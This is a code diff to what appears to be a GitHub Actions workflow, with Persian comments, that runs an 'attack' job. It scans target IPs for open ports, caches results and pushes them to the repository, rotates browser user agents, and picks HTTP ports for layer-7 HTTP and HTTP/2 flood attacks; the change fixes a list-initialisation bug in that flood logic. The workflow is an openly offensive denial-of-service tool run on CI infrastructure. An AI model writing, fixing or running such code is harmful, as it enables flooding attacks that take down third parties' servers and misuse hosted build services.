@@ -30,7 +30,7 @@ on:
         default: '50'
 
 permissions:
-  contents: write  # برای push کردن فایل‌های کش
+  contents: write
 
 jobs:
   attack:
@@ -74,11 +74,10 @@ jobs:
           # ========== پیکربندی ==========
           CACHE_DIR = Path("scan_results")
           CACHE_FILE = CACHE_DIR / "targets_cache.json"
-          CACHE_VALID_HOURS = 24  # عمر مفید کش به ساعت
+          CACHE_VALID_HOURS = 24
 
           # ========== ۱. مدیریت کش ==========
           def load_cache():
-              """بارگذاری کش از فایل JSON"""
               if not CACHE_FILE.exists():
                   return {}
               try:
@@ -88,13 +87,11 @@ jobs:
                   return {}
 
           def save_cache(cache_data):
-              """ذخیره کش در فایل JSON"""
               CACHE_DIR.mkdir(parents=True, exist_ok=True)
               with open(CACHE_FILE, 'w') as f:
                   json.dump(cache_data, f, indent=2)
 
           def get_cached_scan(target_ip):
-              """بررسی وجود نتیجه اسکن معتبر برای یک IP"""
               cache = load_cache()
               if target_ip in cache:
                   entry = cache[target_ip]
@@ -107,7 +104,6 @@ jobs:
               return None
 
           def update_cache(target_ip, target_host, open_ports):
-              """به‌روزرسانی کش با نتایج جدید"""
               cache = load_cache()
               cache[target_ip] = {
                   'host': target_host,
@@ -115,7 +111,6 @@ jobs:
                   'ports': open_ports
               }
               save_cache(cache)
-              # کامیت و پوش خودکار
               os.system(f"git add {CACHE_FILE} && git commit -m 'Update scan cache for {target_host}' && git push 2>/dev/null || true")
               console.print("[green]📥 نتایج اسکن در کش ذخیره و به مخزن ارسال شد.[/green]")
 
@@ -167,7 +162,7 @@ jobs:
                               open_ports.append({'port': port, 'service': service})
               return open_ports
 
-          # ========== بقیه توابع کمکی و موتورهای حمله (بدون تغییر) ==========
+          # ========== بقیه توابع کمکی و موتورهای حمله ==========
           USER_AGENTS = [
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
@@ -287,6 +282,7 @@ jobs:
                   
                   # انتخاب پورت‌های HTTP/HTTPS برای حملات لایه ۷
                   if ATTACK in ('l7_http_flood', 'l7_http2_flood'):
+                      target_ports = []  # <-- اصلاح: تبدیل به لیست خالی
                       for p in open_ports:
                           if 'http' in p['service'].lower() or 'ssl' in p['service'].lower():
                               target_ports.append(p['port'])
